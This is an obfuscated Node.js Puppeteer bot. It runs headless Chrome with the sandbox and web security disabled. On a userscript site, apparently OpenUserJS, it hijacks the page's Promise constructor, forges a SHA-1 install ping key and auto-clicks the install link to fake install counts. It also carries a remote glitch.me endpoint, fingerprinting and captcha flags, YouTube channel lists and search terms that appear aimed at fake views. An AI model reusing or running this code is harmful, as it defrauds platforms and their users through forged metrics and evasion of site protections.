J[0xbcc + 0x1655 + -0x2215] = J[-0x1 * -0xb6 + 0xaaf + -0x42 * 0x2c] = J[0x1a12 + -0x23de * -0x1 + -0x2 * 0x1ef1] = J[0x29d + 0x6 * -0x38a + 0x12ae] = 0x1fad + 0x19a3 * -0x1 + 0x60a * -0x1), J[-0xfab + -0x39b * 0x4 + 0x1e25 * 0x1] = this['hBytes'] << -0x1 * 0x3f9 + 0x2036 + 0x1c3a * -0x1 | this['bytes'] >>> 0x2e * 0x95 + 0x692 + 0x2f * -0xb5, J[-0x153 * -0x3 + 0x11 * 0x207 + -0x2661] = this['bytes'] << -0x19f3 * 0x1 + 0x3 * 0x2a7 + 0x1201, this['hash']();
              }
            }
            ['hash']() {
              var J, K, L = this['h0'],
                M = this['h1'],
                N = this['h2'],
                O = this['h3'],
                P = this['h4'],
                Q = this['blocks'];
              for (J = 0xea0 + -0x192c + 0xa9c; J < 0x1179 + -0x2ff * -0x1 + -0x1428; ++J)
                K = Q[J - (0x16e4 + 0x3 * -0x83 + -0x1558)] ^ Q[J - (0xb * -0x62 + 0x20bb * -0x1 + 0xc53 * 0x3)] ^ Q[J - (0x1263 + -0x774 + 0x5 * -0x22d)] ^ Q[J - (0xf46 * 0x2 + -0x59 * -0x63 + -0x40e7)], Q[J] = K << -0xf70 + -0x2411 + 0x3382 | K >>> -0x5 * 0x154 + -0x19e2 + -0x20a5 * -0x1;
              for (J = -0x2 * 0xfef + 0x13bb + 0xd * 0xef; J < -0x77 * 0x26 + 0x1ecb + -0xd0d; J += -0x1ec * 0x8 + -0x3 * 0xbf + 0x4a * 0x3d)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x7c1 * -0x4 + -0x547 * 0x4 + -0x9e3 * 0x1 | L >>> -0x16d5 + 0x171a + -0x1 * 0x2a) + (M & N | ~M & O) + P + (0x52cfd9f8 * 0x1 + -0x1042 * 0x9753 + 0x114ed307) + Q[J] << -0x2699 + -0x21fd + 0x3d2 * 0x13) << 0x1f21 + -0x143a * -0x1 + -0x3356 * 0x1 | P >>> 0xbfe + 0x1997 * 0x1 + 0x9 * -0x42a) + (L & (M = M << -0xc70 + -0x1 * -0x304 + 0x98a | M >>> -0x8 * -0x171 + 0x4a2 + 0x4 * -0x40a) | ~L & N) + O + (0x2c9 * 0x199d8b + 0x2238b2a4 + 0xf0e012e * -0x1) + Q[J + (-0xa38 * -0x3 + -0x35 * -0x4a + -0x3 * 0xf53)] << 0xb * 0x1ca + 0x6f7 * -0x5 + 0xf25) << -0x2 * -0x437 + -0x2392 + 0x1b29 | O >>> 0x32 * 0x1 + 0x647 * -0x1 + 0x210 * 0x3) + (P & (L = L << 0x69e + 0x3 * -0x98e + 0x162a * 0x1 | L >>> 0x1 * 0x94d + -0x1672 + 0x5b * 0x25) | ~P & M) + N + (0x3ff609 * -0x75 + -0x5643140 * 0x17 + 0x3 * 0x513f72d2) + Q[J + (0x15ef + -0x18d1 + 0x94 * 0x5)] << 0x6 * -0x2d7 + 0x11f4 + -0xea) << -0x1 * 0x1deb + 0x40f * 0x1 + 0x19e1 | N >>> -0x23c1 * -0x1 + -0xc7c * -0x3 + 0x248d * -0x2) + (O & (P = P << 0x1682 + 0xe * 0x1ad + 0x2dda * -0x1 | P >>> -0x7b5 * 0x3 + -0x105 * -0x1d + -0x1 * 0x670) | ~O & L) + M + (0x2bb24cbd + 0x53735797 + -0x1 * 0x24a32abb) + Q[J + (-0x1de0 + -0x7cd * 0x1 + -0x25b * -0x10)] << 0x6d * -0x29 + 0x1 * -0x2163 + 0x32d8) << -0x150b + 0x5cb + 0xf45 | M >>> -0x25f * -0x4 + 0x226 * 0x10 + -0x1 * 0x2bc1) + (N & (O = O << 0xc18 + 0x77 * 0x3d + -0x2855 | O >>> 0x1912 + -0xe8 * 0x11 + -0x9a8) | ~N & P) + L + (0xa5e5ca13 + 0x223d1 * 0x42dd + -0x1 * 0xda781de7) + Q[J + (-0x1357 * 0x1 + 0x277 * -0xf + 0x3854)] << 0x677 + 0x1 * 0x11e + 0x1 * -0x795, N = N << 0x20e9 + 0x996 + -0x2a61 | N >>> 0x1ee1 * 0x1 + 0x3 * 0x24d + -0x5 * 0x78e;
              for (; J < -0x1 * -0x1442 + -0x17f9 + 0x3df * 0x1; J += 0x1 * 0x1b27 + 0x12ee * -0x2 + 0xaba)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x1fb5 + 0xe91 + 0x3 * -0xf6b | L >>> 0x406 + 0xb17 + -0xf02) + (M ^ N ^ O) + P + (-0xcbc881fb + 0x98669f2d * 0x1 + 0xa23bce6f) + Q[J] << 0xc * 0x2de + -0x9 * -0xf1 + -0x2ae1) << 0x2 * 0x1fa + 0x1f3f * 0x1 + -0x232e | P >>> 0x25c2 + 0x49e + -0x2a45) + (L ^ (M = M << -0x21e2 + 0x4bd * 0x5 + 0xa4f | M >>> -0x57d * 0x5 + 0x3 * 0x5d9 + 0x9e8) ^ N) + O + (-0x6 * 0x1e2cce3a + 0x6a7c * -0x1dd6b + 0x1 * 0x1ea7c4ed1) + Q[J + (-0xedb * 0x1 + -0x129e + -0x359 * -0xa)] << 0x380 + -0x3 * -0x81 + -0x503) << 0x24a0 + 0xfe * 0x1e + 0xd * -0x51b | O >>> -0x592 * 0x6 + 0xd0b + 0x147c) + (P ^ (L = L << 0x3 * 0x957 + 0xd05 + -0x28ec | L >>> 0x7b * 0x1f + -0xdc2 * 0x2 + 0x1 * 0xca1) ^ M) + N + (0x17d87841 + 0x77129d07 * -0x1 + 0xce141067) + Q[J + (-0x1 * 0xb26 + 0xd40 + 0x86 * -0x4)] << 0xf27 + 0xc8a + -0x1bb1) << 0x3 * 0x488 + -0x6d * -0x53 + -0x30ea | N >>> -0x12 * 0x121 + 0x1 * -0x8a7 + -0x2 * -0xe8a) + (O ^ (P = P << -0x83 * -0x2f + -0x1 * 0x338 + -0x14b7 | P >>> 0x1196 + -0x187 * 0x15 + -0xe7f * -0x1) ^ L) + M + (0x4dd1 * -0x15afd + 0xa503cdbd + 0x334f7f71) + Q[J + (0x25b9 * 0x1 + -0x2621 + -0x1 * -0x6b)] << -0x18c0 + -0x26f3 + 0x3fb3) << -0x6be * 0x1 + -0x1 * 0xb2d + -0x290 * -0x7 | M >>> -0x1698 + 0xce * -0x1d + 0x2e09) + (N ^ (O = O << -0x1866 + -0x160 + 0x19e4 | O >>> -0x2ed * -0x5 + 0x90f + 0xe * -0x1b1) ^ P) + L + (-0xa3 * 0x96069b + -0x17a * -0x1d8e51 + -0xa2bbfcb8 * -0x1) + Q[J + (0x25 * -0xa7 + 0xbff * 0x1 + -0x4 * -0x30a)] << 0x6 * 0x137 + -0x2219 + -0x1acf * -0x1, N = N << -0x23f2 + -0x20af + 0x44bf | N >>> 0x1be9 + 0x1e54 + -0x3a3b;
              for (; J < 0x2308 + -0xe16 + -0x14b6; J += 0x1 * 0x2638 + 0x1 * -0x15f8 + -0x103b)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x1 * 0x9ef + -0x8a8 + 0x129c | L >>> 0x71 * 0xe + 0x8a1 + -0xeb4) + (M & N | M & O | N & O) + P - (0x799339 + 0xadb3b8e9 + -0x3d4908fe) + Q[J] << -0xf * -0x13 + -0x5 * -0x1c3 + 0x2 * -0x4f6) << -0x4e5 + -0x12ab + 0x1795 | P >>> 0x2 * 0x10f6 + 0x1eab + -0x101f * 0x4) + (L & (M = M << 0x1061 + -0x49 * 0x25 + 0x2 * -0x2db | M >>> -0xeb9 + -0x115e + 0x2019) | L & N | M & N) + O - (-0xc6a7cdf7 + 0x6e961907 + -0x647afc0a * -0x2) + Q[J + (0x42e + 0x1b * 0x2b + 0xa * -0xdf)] << 0x3 * 0x6ad + -0xc * 0x30f + 0x58f * 0x3) << -0x1 * 0x1bc5 + -0x5 * -0x611 + -0x28b * 0x1 | O >>> -0x116 * -0xc + 0x5 * -0x503 + -0x2 * -0x611) + (P & (L = L << 0xd25 + 0x10d * 0x1f + 0x1 * -0x2d9a | L >>> -0x202 * -0x1 + 0xc * -0x292 + 0x1 * 0x1cd8) | P & M | L & M) + N - (-0x23d66c1e + 0x5231fbe2 + 0x30 * 0x162d912) + Q[J + (-0x217b + -0x2 * -0xd03 + 0x777)] << -0x25fc + 0x1403 + -0x6b * -0x2b) << -0x1 * 0x1d4b + 0x425 * 0x1 + -0x17b * -0x11 | N >>> -0xc26 + -0x20d8 + 0x2d19) + (O & (P = P << -0x256b + 0xf6 * -0x3 + 0x1 * 0x286b | P >>> -0x6b5 + -0x8f7 + 0x1 * 0xfae) | O & L | P & L) + M - (-0xcefc6f65 + -0x71df7934 + 0x1 * 0x1b1c02bbd) + Q[J + (0x581 * 0x4 + 0x1b04 + -0x1 * 0x3105)] << 0x1722 + -0x203c + 0x91a) << 0xe0e * 0x1 + -0x2170 + -0x1367 * -0x1 | M >>> 0x2 * -0xd77 + -0x1630 + 0x3139) + (N & (O = O << 0x170a + 0x1e08 + 0x34f4 * -0x1 | O >>> 0x1d5f + -0xd97 * -0x1 + -0x2af4) | N & P | O & P) + L - (-0x515a58b0 + -0xce5d5a8f + -0x1909bf663 * -0x1) + Q[J + (-0xc70 + 0x1fbc + -0x1348)] << -0x2c + 0x4 * 0x710 + -0x1c14, N = N << 0x1 * -0x1499 + -0x11ca + 0x1 * 0x2681 | N >>> -0x1bcf + -0x1 * 0xe27 + 0x29f8;
              for (; J < 0x1f76 + 0xa72 + -0x2998; J += 0x3c * 0x51 + 0x36f + -0x1666)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x2472 + -0xe * -0x168 + 0xb39 * -0x5 | L >>> -0x809 + 0x1694 * 0x1 + -0xe70) + (M ^ N ^ O) + P - (-0xba71 * 0xc39 + 0x570561fd + 0x2e * -0x886073) + Q[J] << -0x9 * -0xb7 + 0x1671 + -0x1ce0) << -0x7 * 0x18e + -0x1 * 0x18e6 + 0x23cd | P >>> 0x4 * 0x266 + 0x712 + -0x108f) + (L ^ (M = M << -0x11bc + -0x1c8c + 0x1733 * 0x2 | M >>> 0x117c + -0x1490 + 0x2 * 0x18b) ^ N) + O - (-0x41021531 + 0x5f15280e + 0x178a2b4d) + Q[J + (-0x2295 + -0xf99 + 0x322f)] << 0x8e * -0xe + 0x59 * -0x65 + 0x2ae1) << -0xe * 0x40 + -0x925 + 0xcaa | O >>> 0x1a * -0x12e + 0x1 * -0x18b4 + 0x377b * 0x1) + (P ^ (L = L << 0x1065 + -0x163a + 0x1 * 0x5f3 | L >>> 0x1219 * -0x1 + -0x1079 + -0x1 * -0x2294) ^ M) + N - (0x6799 * 0x47b1 + -0xb1bcac9 + 0x23b5f92a) + Q[J + (0x2333 + 0x1 * -0x15f3 + -0x46a * 0x3)] << 0x14e1 + 0x44 * -0x79 + -0x3 * -0x3c1) << 0x3 * 0x943 + -0x31d * -0x9 + 0x1 * -0x37c9 | N >>> 0x1556 + 0x1264 + -0x7 * 0x5a9) + (O ^ (P = P << -0xec * -0x10 + -0x2e4 + -0xbbe | P >>> -0x2ad + 0x264 + 0x4b * 0x1) ^ L) + M - (-0x4 * -0x5f6f15f + -0x67cf2b0e + 0x8590a3bc) + Q[J + (0xcb6 + 0x1 * 0x160e + -0x7 * 0x4f7)] << 0x1 * 0x123c + -0x10c7 + -0x1 * 0x175) << 0x10cb * 0x2 + -0x1f3 + -0x1f9e | M >>> 0x17bf * 0x1 + -0x11e8 + -0x16f * 0x4) + (N ^ (O = O << -0x24da + -0xa * 0x232 + 0x24 * 0x1a3 | O >>> 0x16e3 + -0x115b + -0xca * 0x7) ^ P) + L - (0x3085 * -0x14c1a + 0x4a * -0xe2b6c6 + 0x1e1 * 0x60e9e8) + Q[J + (0x1182 + 0x30 + -0x11ae)] << -0x1a4b + 0x1400 + 0x64b, N = N << 0x51 * -0x2a + -0x1 * 0xce7 + 0x1a4f | N >>> 0x1d4 * 0xe + 0x8e * 0x7 + 0xb8 * -0x29;
              this['h0'] = this['h0'] + L << 0x1 * -0x697 + 0x1a74 + -0x3 * 0x69f, this['h1'] = this['h1'] + M << -0x2 * 0x8e2 + 0x3fd + 0xdc7, this['h2'] = this['h2'] + N << -0x49b + 0x1 * 0x9c4 + -0x529, this['h3'] = this['h3'] + O << 0x1 * -0xcb3 + 0x4d3 + 0x7e0, this['h4'] = this['h4'] + P << -0x2328 + 0x155a + 0xdce;
            }
            ['hex']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return w[J >> -0x12a3 + 0x1dce + -0x13 * 0x95 & -0x1625 * 0x1 + 0x2365 + -0xd31] + w[J >> -0x86 * 0x3 + 0x2285 + -0x20db & 0x1e9d + 0x1fcc + -0x3e5a] + w[J >> 0x1b7 * 0x13 + 0x1f69 + -0x3fea & 0xbe2 + 0xa * 0x13 + 0xc91 * -0x1] + w[J >> -0x5 * 0x765 + 0x33 + 0x17 * 0x19a & 0xcc * 0x1b + 0x59c + -0x1b11 * 0x1] + w[J >> 0x1ca + -0x1562 + 0x13a4 & 0x1af0 + -0x234 * 0x8 + -0x941] + w[J >> -0xb * -0x259 + 0x18c2 + 0x328d * -0x1 & -0x89a + -0x72 * 0x17 + 0x1 * 0x12e7] + w[J >> 0xb8 * -0x33 + 0x17e + 0x1 * 0x232e & -0xb36 + -0xbab * -0x3 + -0x4 * 0x5ef] + w[0x12e8 + 0x10f * 0x17 + -0x2b32 & J] + w[K >> -0x8eb + 0x26a + 0x69d & -0x2 * -0x589 + -0x17 * 0x14f + -0xe * -0x15d] + w[K >> -0x2 * 0x1204 + -0xc51 + -0x3071 * -0x1 & -0x1923 + 0x66f + -0x3 * -0x641] + w[K >> -0x26f2 + 0x5 * -0x4eb + 0xcb9 * 0x5 & -0x5 * 0x7c7 + -0x164f + 0x3d41] + w[K >> -0x461 + 0x31d * -0xa + 0x2393 & -0xea8 + 0x20a6 + -0x11ef] + w[K >> 0x117a * 0x1 + -0xf65 + -0x209 * 0x1 & -0x69 * 0x51 + -0x1045 + 0x318d] + w[K >> -0x1c3e + -0x106f * -0x2 + 0x126 * -0x4 & -0x77 * -0x2e + -0x1515 * -0x1 + 0x4 * -0xa9a] + w[K >> 0x1 * -0x193d + -0x1ddb + 0x371c & 0xe * 0x8e + -0x23b * -0xa + -0x1e03] + w[0x26 * 0x16 + -0x2479 + 0x2144 & K] + w[L >> 0xbc * 0x12 + 0x129 + -0xe45 & 0x683 + 0xc07 + -0x127b] + w[L >> 0x17f9 + -0x2233 + 0xa52 & 0x122 * -0x16 + -0x58 + 0x1953] + w[L >> 0x25e7 + 0x11e + -0x26f1 & 0xe32 + 0x1b18 + -0x5 * 0x83f] + w[L >> 0x24dd + 0x68d * 0x4 + -0x3f01 & -0x615 + 0xeb9 * 0x2 + -0x13 * 0x13a] + w[L >> -0x1254 + -0x60 + 0x12c0 & 0xa0c + -0x1a3 * -0x2 + -0xd43 * 0x1] + w[L >> -0xa * -0x31b + 0x2 * -0x72b + 0x2c8 * -0x6 & -0x2d3 * 0x3 + -0x5a * 0x4d + 0x3e * 0x93] + w[L >> -0x834 + 0x2 * 0xccd + 0x5 * -0x37a & 0x16c2 + -0x2498 + 0xde5 * 0x1] + w[0x19b2 * 0x1 + 0x189 + -0x2f * 0x94 & L] + w[M >> 0xe7 + 0x3f2 + -0x4bd * 0x1 & -0x1950 + -0x15f3 + -0x2f52 * -0x1] + w[M >> 0x601 * 0x5 + -0x26cf + -0x17b * -0x6 & 0x1a3f + -0xaec + -0x3d1 * 0x4] + w[M >> -0xfea + 0x1e6f + -0xe71 * 0x1 & 0x95 + -0x17 * 0x3 + -0x5 * 0xd] + w[M >> -0x2565 + -0x4f8 * 0x3 + 0x345d * 0x1 & 0xc * -0x158 + 0x1 * -0xd36 + 0x1d65] + w[M >> -0x16cb + -0x15d7 * 0x1 + 0x12d * 0x26 & 0x11 * -0x3d + 0x276 * -0x1 + 0x2 * 0x349] + w[M >> 0xf61 + 0x14f * 0x17 + -0x2d72 & 0x11f * -0x13 + -0xd8d * -0x2 + 0x62 * -0xf] + w[M >> -0x6e0 + -0x16 * -0xd9 + -0xbc2 & 0x235 * 0x7 + 0x67 * 0x47 + -0x5d * 0x79] + w[-0x1f81 + 0x1a99 + 0x1 * 0x4f7 & M] + w[N >> 0x3 * 0x796 + 0x110f + -0x27b5 & -0x133b + -0x1 * 0x1f42 + -0x2 * -0x1946] + w[N >> -0x33b * -0x8 + -0xba5 * -0x1 + -0x1 * 0x2565 & -0x8b + -0x1c35 + -0x1ccf * -0x1] + w[N >> 0x293 + 0x1 * -0x397 + 0x118 & -0x4c1 * 0x2 + -0x25e8 * 0x1 + 0x2f79] + w[N >> 0x21c5 + -0xe8e + 0x1 * -0x1327 & -0xbbc * -0x1 + -0xff6 + 0x449] + w[N >> 0x1c67 + -0x1 * 0x1e49 + -0x1ee * -0x1 & 0x186b + 0xa * 0x325 + -0x129a * 0x3] + w[N >> -0x1389 + 0x3 * 0x664 + 0x65 & -0x1a0a + 0x1392 + 0x687] + w[N >> -0x1421 * 0x1 + -0x22f8 + 0x371d & 0xba6 + -0x15a5 + -0x8f * -0x12] + w[0x6cf + -0x39b * 0x1 + 0x73 * -0x7 & N];
            }
            ['digest']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return [
                J >> 0x1565 + 0xe53 + -0x23a0 & -0x1484 + 0x239a + 0xe17 * -0x1,
                J >> 0x1 * -0x3fb + 0x1 * -0x1d51 + 0x215c & -0x1c0c * -0x1 + -0x1d * 0xac + -0x791,
                J >> 0x543 + 0x21e6 + -0x2721 & 0x16 * 0x19e + 0x15c5 * -0x1 + -0xcd0,
                -0x989 * -0x3 + 0x1 * 0x7ed + 0x1 * -0x2389 & J,
                K >> 0x23 * 0x13 + -0x23b * 0x9 + 0x2 * 0x8c9 & -0x110e * 0x2 + -0x52 * 0x4a + 0x3acf,
                K >> 0x2b * -0x37 + -0x25b2 + -0xe3 * -0x35 & -0x1352 + -0x2d4 * 0x1 + 0x1725,
                K >> -0x1c4b + 0x15d0 + 0x683 & 0x1913 * 0x1 + -0x1 * -0x472 + -0x1c86,
                -0x17f8 + 0x14cc + 0x61 * 0xb & K,
                L >> -0x1 * 0xfc4 + 0x9b6 + -0x2 * -0x313 & -0x1a14 + 0x2168 + -0x655,
                L >> -0x74 * -0x17 + 0x9 * -0xdf + 0xf * -0x2b & -0x11 * 0x151 + -0x114 + 0x1874,
                L >> -0x209c + -0x4 * 0x3fb + 0x38 * 0xde & 0x22f5 + 0x1a8a * -0x1 + -0x76c,
                0x1 * -0x2ba + 0x2311 + -0x11 * 0x1d8 & L,
                M >> 0x1271 + -0x1 * 0x11ef + -0x6a & -0x5ef + -0xac + 0x79a,
                M >> -0x1b + -0x429 + -0x2 * -0x22a & 0x69 + -0xfc6 + 0x574 * 0x3,
                M >> 0xa * 0x1c4 + 0x125 * -0x5 + -0xbe7 * 0x1 & -0xf * 0x49 + -0x19bd + -0x11 * -0x1d3,
                0x40 + 0x5 * 0xc7 + -0x6 * 0x86 & M,
                N >> 0x148e + 0xbd6 + -0x204c & -0xd * -0x26b + -0xa38 + -0x1438,
                N >> 0x4de + 0x623 + 0x1 * -0xaf1 & -0x1088 + 0x204c + -0xec5,
                N >> 0x13af + 0x92 * -0xb + -0xd61 & -0x8b0 * -0x2 + -0x16e1 * -0x1 + 0x32 * -0xc9,
                -0x1 * 0x9e7 + -0x16f6 + 0x21dc & N
              ];
            }
            ['arrayBuffe' + 'r']() {
              var J, K;
              return this['finalize'](), J = new ArrayBuffer(-0x71b + 0x945 + -0x216), (K = new DataView(J))['setUint32'](0x136d * -0x2 + -0x2313 + 0x49ed, this['h0']), K['setUint32'](0x3 * 0x679 + -0x1c45 + 0xe3 * 0xa, this['h1']), K['setUint32'](-0x1a8b + -0x1122 + 0x1 * 0x2bb5, this['h2']), K['setUint32'](-0x2e * 0x32 + -0x1 * -0x2473 + -0x1 * 0x1b6b, this['h3']), K['setUint32'](-0x1 * -0x15f7 + -0x168 + -0x147f, this['h4']), J;
            }
        }
        G['prototype']['toString'] = G['prototype']['hex'], G['prototype']['array'] = G['prototype']['digest'];
        const H = C();
        window['localStora' + 'ge']['setItem']('manualOver' + 'rideInstal' + 'lJS', '1');
        let I = document['getElement' + 'sByClassNa' + 'me']('install-li' + 'nk')[0x5d * 0xe + 0xd66 + -0x127c];
        return window['Promise'] = class extends window['Promise'] {
          constructor(...J) {
            let K = -0x191b + 0x2f1 * 0x3 + 0x1048;
            J[0xca9 + -0xb4f + 0x1 * -0x15a]['toString']()['includes']('getAttribu' + 'te(\x22data-p' + 'ing-url') && (J[-0x7f2 + -0x9d4 * 0x1 + 0x15e * 0xd] = L => {
              let M = I['getAttribu' + 'te']('data-ping-' + 'url');
              if (M) {
                let N = H(I['getAttribu' + 'te']('data-ip-ad' + 'dress') + I['getAttribu' + 'te']('data-scrip' + 't-id') + I['getAttribu' + 'te']('data-ping-' + 'key')),
                  O = new XMLHttpRequest();
                O['open']('POST', M + ('&mo=3&ping' + '_key=') + encodeURIComponent(N), 0xf2c * -0x1 + 0x39 * -0xa7 + 0x3 * 0x1174), O['overrideMi' + 'meType']('text/plain'), O['onload'] = () => {}, O['send'](), K = 0x3 * -0x8e7 + 0x606 + 0x14b0;
              }
            }), K || super(...J);
          }
        }, window['setTimeout'](() => {
          I['click']();
        }, -0x164f * -0x1 + 0x1690 + -0x3 * 0xd01), Promise['resolve'](0xa8a + 0x12f2 + -0x1 * 0x1d7b);
      })), log('after...'), await new Promise(w => setTimeout(w, NETWORK_PATIENCE)), await s['close'](), await r['close'](), i())) : (await s['close'](), await r['close'](), i());
    }
  }
  for (let j = -0x2 * 0xc6f + -0x241f + 0x3cfd; j < 0xa81 + -0x2 * -0x1345 + -0x1 * 0x310a; j++)
    i();
}

function b(c, d) {
  const e = a();
  return b = function(f, g) {
    f = f - (0x1 * -0x8e1 + -0xdcf + 0x16b0);
    let h = e[f];
    if (b['FQAghZ'] === undefined) {
      var i = function(n) {
        const o = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let p = '',
          q = '';
        for (let r = -0x2092 + -0x1 * -0x95 + 0x1ffd * 0x1, s, t, u = 0x836 + -0x1fdc + -0x2 * -0xbd3; t = n['charAt'](u++); ~t && (s = r % (0xbb + -0x15b * 0x7 + 0x8c6) ? s * (-0x1d9f + 0x2117 * -0x1 + 0x3ef6) + t : t, r++ % (-0x7f9 + -0xb1d + -0x98d * -0x2)) ? p += String['fromCharCode'](0x1509 + -0x124f + 0x1bb * -0x1 & s >> (-(-0x218f + 0x8c * -0x1d + 0x316d) * r & -0xa * -0x2d0 + 0x76e * 0x1 + -0x2388)) : 0x1d98 + 0xa47 * 0x1 + -0xad * 0x3b) {
          t = o['indexOf'](t);
        }
        for (let v = 0x1ebc + 0x8 * -0x277 + -0xb04, w = p['length']; v < w; v++) {
          q += '%' + ('00' + p['charCodeAt'](v)['toString'](0x25cc + 0x35 * -0x90 + 0x34 * -0x27))['slice'](-(-0x76 * -0xc + -0x2 * 0xe39 + -0x3 * -0x7a4));
        }
        return decodeURIComponent(q);
      };
      const m = function(n, o) {
        let p = [],
          q = 0x1c42 + 0x125e * 0x2 + 0x15aa * -0x3,
          r, t = '';
        n = i(n);
        let u;
        for (u = 0x2e * 0x6 + 0x5 * 0x6fa + -0x23f6; u < 0x26f * -0x1 + 0x4f8 + -0x189; u++) {
          p[u] = u;
        }
        for (u = -0x1bdf + 0x3d1 * 0x6 + -0x13 * -0x43; u < 0x193 * 0x7 + 0x87d + -0x1282; u++) {
          q = (q + p[u] + o['charCodeAt'](u % o['length'])) % (-0x7f7 + 0x13e5 + -0xaee), r = p[u], p[u] = p[q], p[q] = r;
        }
        u = -0x2 * 0xd40 + -0x38 * -0xaf + -0x1 * 0xbc8, q = -0x1e98 + 0x1ac * 0x7 + -0xc * -0x193;
        for (let v = 0x5 * -0x72f + -0x3cd * -0x6 + -0x1 * -0xd1d; v < n['length']; v++) {
          u = (u + (-0x1bfa + -0x1eac + -0x111 * -0x37)) % (0x322 + -0x57e * 0x2 + 0x8da), q = (q + p[u]) % (0x813 * -0x1 + 0x2 * -0xae0 + -0x1 * -0x1ed3), r = p[u], p[u] = p[q], p[q] = r, t += String['fromCharCode'](n['charCodeAt'](v) ^ p[(p[u] + p[q]) % (-0x20c0 + -0x2663 + 0x139 * 0x3b)]);
        }
        return t;
      };
      b['AwryJm'] = m, c = arguments, b['FQAghZ'] = !![];
    }
    const j = e[-0xce5 + 0xa * -0x28b + -0x2653 * -0x1],
      k = f + j,
      l = c[k];
    return !l ? (b['igKkTl'] === undefined && (b['igKkTl'] = !![]), h = b['AwryJm'](h, g), c[k] = h) : h = l, h;
  }, b(c, d);
}
const NETWORK_PATIENCE = 0x14 * -0x17a + -0x1bfd * -0x1 + 0x20cb + (-0x167e + -0x17bb + 0x847 * 0x7) * Math['random'](),
  MM_NETWORK_PATIENCE = (-0x1a1b + -0x1 * 0xd55 + 0x2773) * NETWORK_PATIENCE,
  url = require('url'),
  doFlags = {
    'doActivateBrowser': 0x1,
    'doGF': 0x0,
    'doSoundCloud': 0x0,
    'doYT': 0x0,
    'doMediumReader': 0x0,
    'doRemoteCaptcha': 0x0,
    'doDual': 0x0,
    'doWhitepagesMode': 0x1,
    'doMiscNetActivity': 0x1,
    'doOUJS': 0x1,
    'doCreateServer': 0x1,
    'doExtFingerprint': 0x1
  },
  {
    log: log,
    warn: warn
  } = console,
  {
    floor: floor,
    random: random,
    ceil: ceil
  } = Math;
let PROCESSED_XURL_VAL = 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/gen_dd_' + 'adkjasbdjq' + 'wkjndwqkdw' + 'qasczxhgcx' + 'zc',
  PROCESSED_SYX_VAL = 'CX001_ZCa';
const pptOptions = {
    'headless': 0x1,
    'setDefaultNavigationTimeout': 0x0,
    'setDefaultTimeout': 0x0,
    'args': [
      '--no-sandb' + 'ox',
      '--disable-' + 'setuid-san' + 'dbox',
      '--disable-' + 'dev-shm-us' + 'age',
      '--disable-' + 'web-securi' + 'ty'
    ]
  },
  axios = require('axios'),
  fetch = require('node-fetch'),
  channels = [
    'https://ww' + 'w.youtube.' + 'com/@Taskm' + 'aster',
    'https://ww' + 'w.youtube.' + 'com/@MrBea' + 'st',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCAiLfjN' + 'XkNv24uhpz' + 'UgPa6A',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCIPPMRA' + '040LQr5QPy' + 'JEbmXA',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCUaT_39' + X(0x3) + '2pWcgw',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UC4-79UO' + 'lP48-QNGgC' + 'ko5p2g',
    'https://ww' + 'w.youtube.' + 'com/@quade' + 'caX8',
    'https://ww' + 'w.youtube.' + 'com/@watch' + 'er',
    'https://ww' + 'w.youtube.' + 'com/@Zyeni' + 'th',
    'https://ww' + 'w.youtube.' + 'com/@RyanG' + 'eorge',
    'https://ww' + 'w.youtube.' + 'com/@Legal' + 'Eagle',
    'https://ww' + 'w.youtube.' + 'com/@jacks' + 'films',
    'https://ww' + 'w.youtube.' + 'com/@fanta' + 'no',
    'https://ww' + 'w.youtube.' + 'com/@NerdE' + 'xplains',
    'https://ww' + 'w.youtube.' + 'com/@HowTo' + 'Basic',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCxjrNGr' + 'X188Riipfm' + 'vejjsg'
  ];
((() => {
  Array['prototype']['repeatExte' + 'nd'] = function(h) {
    let i = this,
      j = i;
    for (let k = -0x14bc + 0x173f + 0x283 * -0x1; k < h; k++)
      j = j['concat'](i);
    return j;
  }, Array['prototype']['random'] = function() {
    return this[floor(random() * this['length'])];
  };
  const f = new Map();
  Array['prototype']['randomFlus' + 'h'] = function(h) {
    let i = this[floor(random() * this['length'])];
    f['has'](h) || f['set'](h, new Set());
    const j = f['get'](h);
    for (; j['has'](i);)
      j['size'] === this['length'] && j['clear'](), i = this[floor(random() * this['length'])];
    return j['add'](i), i;
  };
})());
let searchTerms = [];
searchTerms['push'](('moomoo.io,' + 'moomoo.io\x20' + 'hack,moomo' + 'o.io\x20defea' + 'ting\x20hacke' + 'rs,moomooi' + 'o,moomoo.i' + 'o\x20mods,moo' + 'moo.io\x20ins' + 'ta\x20kill,mo' + 'omoo.io\x20sa' + 'ndbox,moom' + 'oo.io\x20hack' + 's,moomoo.i' + 'o\x20base,moo' + 'moo.io\x20wor' + 'ld\x20record,' + 'moomoo.io\x20' + 'hacker,moo' + 'moo.io\x20hac' + 'k\x20link,moo' + 'moo.io\x20hig' + 'h\x20score,mo' + 'omoo.io\x20tr' + 'olling,moo' + 'moo.io\x20def' + 'eating\x20aut' + 'o\x20healers,' + 'moomoo.io\x20' + 'raiding\x20ba' + 'ses,moomoo' + '.io\x20update' + ',moomoo.io' + '\x202,moomoo.' + 'io\x20tutoria' + 'l,moomoo.i' + 'o\x20gameplay' + ',moomoo.io' + '\x20new\x20updat' + 'e,moomoo.i' + 'o\x20instakil' + 'l,moomoo.i' + 'o\x20highligh' + 'ts,moomoo.' + 'io\x20game')['split'](',')), searchTerms['push'](('mrbeast,mr' + '\x20beast,mrb' + 'east\x20team,' + 'mrbeast\x20cr' + 'ew,the\x20old' + '\x20mrbeast\x20c' + Y(0x5) + 't\x20ex\x20emplo' + 'yees,mrbea' + 'st\x20ex-empl' + 'oyees,mrbe' + 'ast\x20live,m' 